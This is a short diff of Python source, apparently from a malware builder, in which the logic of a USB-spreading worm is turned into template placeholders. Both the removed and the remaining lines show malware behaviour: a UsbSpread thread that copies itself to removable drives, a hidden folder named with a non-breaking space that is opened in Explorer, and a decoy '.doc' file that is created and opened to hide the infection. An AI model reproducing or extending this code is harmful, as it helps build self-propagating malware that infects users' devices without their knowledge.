@@ -621,13 +621,9 @@ if 'VolumeInformation' in sys.argv[0]:
     os.system('explorer %CD%\\' + unichr(160))
     from_device()
 elif __filename__ in sys.argv[0]:
-    usb_spreading_thread = UsbSpread()
-    usb_spreading_thread.start()
+    {%usbSpreading%}
     from_autostart()
 else:
-    if not os.path.exists(os.path.join(os.path.expanduser('~'), '{%working_directory%}')):
-        os.mkdir(os.path.join(os.path.expanduser('~'), '{%working_directory%}'))
-    open(os.path.join(os.path.expanduser('~'), '{%working_directory%}', 'temp0829380013_134.doc'), 'w').write('')
-    os.startfile(os.path.join(os.path.expanduser('~'), '{%working_directory%}', 'temp0829380013_134.doc'))
-    from_device()
+    {%openFakeFile%}
+    {%elseStatement%}
 """
